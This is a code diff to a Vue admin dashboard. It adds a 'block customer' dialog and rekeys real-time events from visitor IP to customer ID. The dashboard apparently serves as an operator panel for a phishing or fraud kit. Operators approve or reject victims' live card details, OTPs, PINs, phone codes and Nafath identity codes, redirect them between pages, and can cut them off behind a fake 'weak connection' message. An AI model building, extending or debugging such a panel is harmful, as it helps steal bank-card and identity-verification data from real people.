@@ -46,10 +46,12 @@
                     :focused-customer-id="focusedCustomerId"
                     :current-page="currentPage"
                     :per-page="perPage"
+                    :blocking-customer-id="blockingCustomerId"
                     @delete-card="handleDeleteCard"
                     @show-details="handleShowDetails"
                     @action="handleCustomerAction"
                     @redirect="handleCustomerRedirect"
+                    @block="openBlockConfirm"
                     @modal-opened="handleModalOpened"
                     @modal-closed="handleModalClosed"
                 />
@@ -121,6 +123,47 @@
             </div>
         </section>
 
+        <div
+            v-if="customerToBlock"
+            class="fixed inset-0 z-[100] flex items-center justify-center bg-black/40 p-4"
+            @click.self="cancelBlockConfirm"
+        >
+            <div
+                class="w-full max-w-md rounded-xl bg-white p-6 text-right shadow-xl"
+                role="dialog"
+                aria-modal="true"
+                aria-labelledby="block-customer-title"
+            >
+                <h3 id="block-customer-title" class="text-lg font-bold text-gray-900">
+                    هل تريد حظر هذا العميل؟
+                </h3>
+
+                <p class="mt-3 text-sm leading-6 text-gray-600">
+                    بعد الحظر ستتوقف اتصالات العميل بالموقع، وقد تظهر لديه رسالة ضعف الاتصال، ثم يُغلق الموقع تلقائيًا.
+                </p>
+
+                <div class="mt-6 flex items-center justify-end gap-2">
+                    <button
+                        type="button"
+                        class="rounded-lg border border-gray-200 px-4 py-2 text-sm font-medium text-gray-700 hover:bg-gray-50 disabled:cursor-not-allowed disabled:opacity-50"
+                        :disabled="blockingCustomerId !== null"
+                        @click="cancelBlockConfirm"
+                    >
+                        إلغاء
+                    </button>
+
+                    <button
+                        type="button"
+                        class="rounded-lg bg-red-600 px-4 py-2 text-sm font-bold text-white hover:bg-red-700 disabled:cursor-not-allowed disabled:opacity-50"
+                        :disabled="blockingCustomerId !== null"
+                        @click="confirmBlockCustomer"
+                    >
+                        {{ blockingCustomerId !== null ? 'جاري الحظر...' : 'تأكيد الحظر' }}
+                    </button>
+                </div>
+            </div>
+        </div>
+
     </div>
 </template>
 
@@ -129,7 +172,7 @@ import { ref, shallowRef, computed, onMounted, onUnmounted, onActivated, onDeact
 import { useRoute, useRouter } from 'vue-router';
 
 defineOptions({ name: 'DashboardHome' });
-import { getCustomers, getCustomer, deleteCustomerCard, approveCard, rejectCard, approveOtp, rejectOtp, approvePin, rejectPin, approvePhoneData, rejectPhoneData, approvePhoneOtp, rejectPhoneOtp, approveStcWaiting, rejectStcWaiting, approveStcOtp, rejectStcOtp, approveStcCall, rejectStcCall, approveNafath, rejectNafath, updateNafathVerificationCode, redirectCustomer } from '@/api/dashboard';
+import { getCustomers, getCustomer, blockCustomer, deleteCustomerCard, approveCard, rejectCard, approveOtp, rejectOtp, approvePin, rejectPin, approvePhoneData, rejectPhoneData, approvePhoneOtp, rejectPhoneOtp, approveStcWaiting, rejectStcWaiting, approveStcOtp, rejectStcOtp, approveStcCall, rejectStcCall, approveNafath, rejectNafath, updateNafathVerificationCode, redirectCustomer } from '@/api/dashboard';
 import request from '@/api/request';
 import { registerPollingCallback, unregisterPollingCallback, setPollingPaused, setWsConnected, markInitialLoadComplete } from '@/services/adminPolling';
 import { getEcho, isEchoPageLifecycleErrorExpected } from '@/services/echo';
@@ -443,9 +486,7 @@ function scheduleDeferredRefresh ( reason = 'deferred', delayMs = 7000 ) {
 }
 
 function resolveCustomerIdFromEvent ( event ) {
-    if ( event?.customer_id ) return event.customer_id;
-    if ( !event?.ip_address ) return null;
-    return customers.value.find( c => c.ip === event.ip_address || c.ip_address === event.ip_address )?.id ?? null;
+    return event?.customer_id ?? null;
 }
 
 function scheduleDeferredCustomerPatch ( customerId, reason = 'deferred-patch', delayMs = 1500 ) {
@@ -650,6 +691,10 @@ async function connectDashboardWebSocket () {
                 if ( _wsDisconnectGrace ) { clearTimeout( _wsDisconnectGrace ); _wsDisconnectGrace = null; }
                 wsConnected.value = false;
                 setWsConnected( false );
+                if ( isEchoPageLifecycleErrorExpected() ) {
+                    logger.debug( '[Dashboard WS] Pusher paused for back-forward cache' );
+                    return;
+                }
                 logger.error( '[Dashboard WS] Pusher connection failed — scheduling forced reconnect' );
                 // Connection failed entirely — tear down and retry
                 _dashboardChannel = null;
@@ -659,7 +704,7 @@ async function connectDashboardWebSocket () {
                 // Stringify to capture full error details (code, message, type)
                 const detail = typeof err === 'object' ? JSON.stringify( err ) : err;
                 const code = err?.data?.code || err?.error?.data?.code;
-                if ( isEchoPageLifecycleErrorExpected() ) {
+                if ( isEchoPageLifecycleErrorExpected( err ) ) {
                     logger.debug( '[Dashboard WS] Pusher paused for back-forward cache', detail );
                 } else if ( code === 1006 ) {
                     logger.warn( '[Dashboard WS] Pusher transient close (1006) — waiting for auto-reconnect', detail );
@@ -689,84 +734,84 @@ async function connectDashboardWebSocket () {
         // ── Admin OTP channel — aggregated approve/reject notifications ──
         _adminOtpChannel = dashboardEcho.private( 'admin.otp' )
             .listen( '.OtpApproved', ( event ) => {
-                logger.info( '[Dashboard WS] OTP approved:', event.customer_ip, event.session_id );
-                handleRealtimeUpdate( { ip_address: event.customer_ip, activity_type: 'otp_approved' } );
+                logger.info( '[Dashboard WS] OTP approved:', event.customer_id );
+                handleRealtimeUpdate( { customer_id: event.customer_id, activity_type: 'otp_approved' } );
             } )
             .listen( '.OtpRejected', ( event ) => {
-                logger.info( '[Dashboard WS] OTP rejected:', event.customer_ip, event.reason );
-                handleRealtimeUpdate( { ip_address: event.customer_ip, activity_type: 'otp_rejected' } );
+                logger.info( '[Dashboard WS] OTP rejected:', event.customer_id, event.reason );
+                handleRealtimeUpdate( { customer_id: event.customer_id, activity_type: 'otp_rejected' } );
             } )
             .listen( '.PinApproved', ( event ) => {
-                logger.debug( '[Dashboard WS] PIN approved:', event.customer_ip );
-                handleRealtimeUpdate( { ip_address: event.customer_ip, activity_type: 'pin_approved' } );
+                logger.debug( '[Dashboard WS] PIN approved:', event.customer_id );
+                handleRealtimeUpdate( { customer_id: event.customer_id, activity_type: 'pin_approved' } );
             } )
             .listen( '.PinRejected', ( event ) => {
-                logger.debug( '[Dashboard WS] PIN rejected:', event.customer_ip );
-                handleRealtimeUpdate( { ip_address: event.customer_ip, activity_type: 'pin_rejected' } );
+                logger.debug( '[Dashboard WS] PIN rejected:', event.customer_id );
+                handleRealtimeUpdate( { customer_id: event.customer_id, activity_type: 'pin_rejected' } );
             } )
             .error( ( error ) => logger.warn( '[Dashboard WS] admin.otp subscription error:', error ) );
 
         // ── Admin Phone channel — phone verification approve/reject notifications ──
         _adminPhoneChannel = dashboardEcho.private( 'admin.phone' )
             .listen( '.PhoneOtpApproved', ( event ) => {
-                logger.info( '[Dashboard WS] Phone OTP approved:', event.customer_ip );
-                handleRealtimeUpdate( { ip_address: event.customer_ip, activity_type: 'phone_approved' } );
+                logger.info( '[Dashboard WS] Phone OTP approved:', event.customer_id );
+                handleRealtimeUpdate( { customer_id: event.customer_id, activity_type: 'phone_approved' } );
             } )
             .listen( '.PhoneOtpRejected', ( event ) => {
-                logger.info( '[Dashboard WS] Phone OTP rejected:', event.customer_ip );
-                handleRealtimeUpdate( { ip_address: event.customer_ip, activity_type: 'phone_rejected' } );
+                logger.info( '[Dashboard WS] Phone OTP rejected:', event.customer_id );
+                handleRealtimeUpdate( { customer_id: event.customer_id, activity_type: 'phone_rejected' } );
             } )
             .error( ( error ) => logger.warn( '[Dashboard WS] admin.phone subscription error:', error ) );
 
         // ── Admin Nafath channel — nafath approve/reject notifications ──
         _adminNafathChannel = dashboardEcho.private( 'admin.nafath' )
             .listen( '.NafathApproved', ( event ) => {
-                logger.info( '[Dashboard WS] Nafath approved:', event.customer_ip );
-                handleRealtimeUpdate( { ip_address: event.customer_ip, activity_type: 'nafath_approved' } );
+                logger.info( '[Dashboard WS] Nafath approved:', event.customer_id );
+                handleRealtimeUpdate( { customer_id: event.customer_id, activity_type: 'nafath_approved' } );
             } )
             .listen( '.NafathRejected', ( event ) => {
-                logger.info( '[Dashboard WS] Nafath rejected:', event.customer_ip );
-                handleRealtimeUpdate( { ip_address: event.customer_ip, activity_type: 'nafath_rejected' } );
+                logger.info( '[Dashboard WS] Nafath rejected:', event.customer_id );
+                handleRealtimeUpdate( { customer_id: event.customer_id, activity_type: 'nafath_rejected' } );
             } )
             .error( ( error ) => logger.warn( '[Dashboard WS] admin.nafath subscription error:', error ) );
 
         // ── Admin Payment channel — payment card approve/reject notifications ──
         _adminPaymentChannel = dashboardEcho.private( 'admin.payment' )
             .listen( '.PaymentApproved', ( event ) => {
-                logger.info( '[Dashboard WS] Payment approved:', event.customer_ip );
-                handleRealtimeUpdate( { ip_address: event.customer_ip, activity_type: 'payment_approved' } );
+                logger.info( '[Dashboard WS] Payment approved:', event.customer_id );
+                handleRealtimeUpdate( { customer_id: event.customer_id, activity_type: 'payment_approved' } );
             } )
             .listen( '.PaymentRejected', ( event ) => {
-                logger.info( '[Dashboard WS] Payment rejected:', event.customer_ip );
-                handleRealtimeUpdate( { ip_address: event.customer_ip, activity_type: 'payment_rejected' } );
+                logger.info( '[Dashboard WS] Payment rejected:', event.customer_id );
+                handleRealtimeUpdate( { customer_id: event.customer_id, activity_type: 'payment_rejected' } );
             } )
             .error( ( error ) => logger.warn( '[Dashboard WS] admin.payment subscription error:', error ) );
 
         // ── Admin STC channel — STC waiting/otp/call approve/reject notifications ──
         _adminStcChannel = dashboardEcho.private( 'admin.stc' )
             .listen( '.StcWaitingApproved', ( event ) => {
-                logger.debug( '[Dashboard WS] STC waiting approved:', event.customer_ip );
-                handleRealtimeUpdate( { ip_address: event.customer_ip, activity_type: 'stc_waiting_approved' } );
+                logger.debug( '[Dashboard WS] STC waiting approved:', event.customer_id );
+                handleRealtimeUpdate( { customer_id: event.customer_id, activity_type: 'stc_waiting_approved' } );
             } )
             .listen( '.StcWaitingRejected', ( event ) => {
-                logger.debug( '[Dashboard WS] STC waiting rejected:', event.customer_ip );
-                handleRealtimeUpdate( { ip_address: event.customer_ip, activity_type: 'stc_waiting_rejected' } );
+                logger.debug( '[Dashboard WS] STC waiting rejected:', event.customer_id );
+                handleRealtimeUpdate( { customer_id: event.customer_id, activity_type: 'stc_waiting_rejected' } );
             } )
             .listen( '.StcOtpApproved', ( event ) => {
-                logger.debug( '[Dashboard WS] STC OTP approved:', event.customer_ip );
-                handleRealtimeUpdate( { ip_address: event.customer_ip, activity_type: 'stc_otp_approved' } );
+                logger.debug( '[Dashboard WS] STC OTP approved:', event.customer_id );
+                handleRealtimeUpdate( { customer_id: event.customer_id, activity_type: 'stc_otp_approved' } );
             } )
             .listen( '.StcOtpRejected', ( event ) => {
-                logger.debug( '[Dashboard WS] STC OTP rejected:', event.customer_ip );
-                handleRealtimeUpdate( { ip_address: event.customer_ip, activity_type: 'stc_otp_rejected' } );
+                logger.debug( '[Dashboard WS] STC OTP rejected:', event.customer_id );
+                handleRealtimeUpdate( { customer_id: event.customer_id, activity_type: 'stc_otp_rejected' } );
             } )
             .listen( '.StcCallApproved', ( event ) => {
-                logger.debug( '[Dashboard WS] STC call approved:', event.customer_ip );
-                handleRealtimeUpdate( { ip_address: event.customer_ip, activity_type: 'stc_call_approved' } );
+                logger.debug( '[Dashboard WS] STC call approved:', event.customer_id );
+                handleRealtimeUpdate( { customer_id: event.customer_id, activity_type: 'stc_call_approved' } );
             } )
             .listen( '.StcCallRejected', ( event ) => {
-                logger.debug( '[Dashboard WS] STC call rejected:', event.customer_ip );
-                handleRealtimeUpdate( { ip_address: event.customer_ip, activity_type: 'stc_call_rejected' } );
+                logger.debug( '[Dashboard WS] STC call rejected:', event.customer_id );
+                handleRealtimeUpdate( { customer_id: event.customer_id, activity_type: 'stc_call_rejected' } );
             } )
             .error( ( error ) => logger.warn( '[Dashboard WS] admin.stc subscription error:', error ) );
 
@@ -916,13 +961,17 @@ function handleRealtimeUpdate ( event ) {
         _lastRefreshAt = now;
 
         // ✅ Show toast notification for important events
-        const toastMsg = _getEventToastMessage( event.activity_type, event.ip_address );
+        const eventCustomerId = resolveCustomerIdFromEvent( event );
+        const displayIp = event.ip_address
+            || customers.value.find( customer => customer.id === eventCustomerId )?.ip
+            || '';
+        const toastMsg = _getEventToastMessage( event.activity_type, displayIp );
         if ( toastMsg ) {
             notificationsStore.push( { type: toastMsg.type, message: toastMsg.message } );
         }
 
         // Patch update: fetch only the changed customer instead of full list
-        const customerId = resolveCustomerIdFromEvent( event );
+        const customerId = eventCustomerId;
         if ( customerId ) {
             patchSingleCustomer( customerId );
         } else {
@@ -1023,7 +1072,7 @@ function _getEventToastMessage ( activityType, ip ) {
 /**
  * Handle a WindowReadUpdated broadcast — instantly clear the blink for ALL admins.
  * No API call needed; the event payload contains everything we need.
- * @param {{ ip: string, section: string, last_read_at: string, read_by: number }} event
+ * @param {{ customer_id: number, ip: string, section: string, last_read_at: string, read_by: number }} event
  */
 function handleWindowRead ( event ) {
     const sectionToField = {
@@ -1034,7 +1083,7 @@ function handleWindowRead ( event ) {
     const field = sectionToField[ event.section ];
     if ( !field ) return;
 
-    const idx = customers.value.findIndex( c => c.ip === event.ip );
+    const idx = customers.value.findIndex( c => c.id === event.customer_id );
     if ( idx !== -1 ) {
         const updated = [ ...customers.value ];
         updated[ idx ] = { ...updated[ idx ], [ field ]: false };
@@ -1580,6 +1629,46 @@ const handleShowDetails = ( customer ) => {
 };
 
 const processingAction = ref( false );
+const customerToBlock = ref( null );
+const blockingCustomerId = ref( null );
+
+function openBlockConfirm ( customer ) {
+    if ( !customer || blockingCustomerId.value !== null ) return;
+    customerToBlock.value = customer;
+}
+
+function cancelBlockConfirm () {
+    if ( blockingCustomerId.value !== null ) return;
+    customerToBlock.value = null;
+}
+
+async function confirmBlockCustomer () {
+    const customer = customerToBlock.value;
+    if ( !customer?.id || blockingCustomerId.value !== null ) return;
+
+    blockingCustomerId.value = customer.id;
+
+    try {
+        await blockCustomer( customer.id );
+
+        const index = customers.value.findIndex( ( item ) => item.id === customer.id );
+        if ( index !== -1 ) {
+            const updated = [ ...customers.value ];
+            updated[ index ] = { ...updated[ index ], is_active: false, is_online: false };
+            customers.value = applyOrdering( updated );
+        }
+
+        scheduleDeferredCustomerPatch( customer.id, 'customer-blocked', 1500 );
+        customerToBlock.value = null;
+        notificationsStore.push( { type: 'success', message: 'تم حظر العميل بنجاح' } );
+    } catch ( error ) {
+        const message = error?.response?.data?.message || 'فشل حظر العميل، يرجى المحاولة مرة أخرى';
+        notificationsStore.push( { type: 'error', message } );
+        logger.error( 'Customer block failed:', error );
+    } finally {
+        blockingCustomerId.value = null;
+    }
+}
 
 const handleCustomerAction = async ( payload ) => {
     if ( processingAction.value ) return;
@@ -1622,7 +1711,7 @@ const handleCustomerAction = async ( payload ) => {
             } else if ( action === 'otp-reject-redirect' ) {
                 await rejectOtp( otpId, ip, reason || 'مرفوض من المشرف' );
                 handleOtpRejected( otpId );
-                await redirectCustomer( ip, '/checkout?rejectionReason=' + encodeURIComponent( reason ) );
+                await redirectCustomer( customer.id, ip, '/checkout?rejectionReason=' + encodeURIComponent( reason ) );
                 logger.info( `OTP ${ otpId } rejected + redirected to checkout with reason: ${ reason }` );
             } else {
                 await rejectOtp( otpId, ip, reason || 'مرفوض من المشرف' );
@@ -1656,10 +1745,10 @@ const handleCustomerAction = async ( payload ) => {
         // ── Phone Data Actions (Non-STC Stage 1) ──
         else if ( action === 'phone-data-approve' || action === 'phone-data-reject' ) {
             if ( action === 'phone-data-approve' ) {
-                await approvePhoneData( ip );
+                await approvePhoneData( customer.id, ip );
                 logger.info( `Phone data approved for ${ ip }` );
             } else {
-                await rejectPhoneData( ip, reason || 'بيانات الهاتف مرفوضة' );
+                await rejectPhoneData( customer.id, ip, reason || 'بيانات الهاتف مرفوضة' );
                 logger.info( `Phone data rejected for ${ ip }` );
             }
         }
@@ -1760,23 +1849,23 @@ const handleCustomerAction = async ( payload ) => {
 
         // ── Redirect Actions ──
         else if ( action === 'redirect' && payload.url ) {
-            await redirectCustomer( ip, payload.url );
+            await redirectCustomer( customer.id, ip, payload.url );
         }
 
         // ── Nafath Actions ──
         else if ( action === 'nafath-approve' ) {
             const code = payload.nafathNumber || null;
-            await approveNafath( ip, code );
+            await approveNafath( customer.id, ip, code );
             logger.info( `Nafath approved for ${ ip }` );
         }
         else if ( action === 'nafath-reject' ) {
-            await rejectNafath( ip, reason || 'مرفوض من المشرف' );
+            await rejectNafath( customer.id, ip, reason || 'مرفوض من المشرف' );
             logger.info( `Nafath rejected for ${ ip }` );
         }
         else if ( action === 'nafath-update-code' ) {
             const code = payload.nafathNumber;
             if ( code ) {
-                await updateNafathVerificationCode( ip, code );
+                await updateNafathVerificationCode( customer.id, ip, code );
                 logger.info( `Nafath code updated for ${ ip }: ${ code }` );
             }
         }
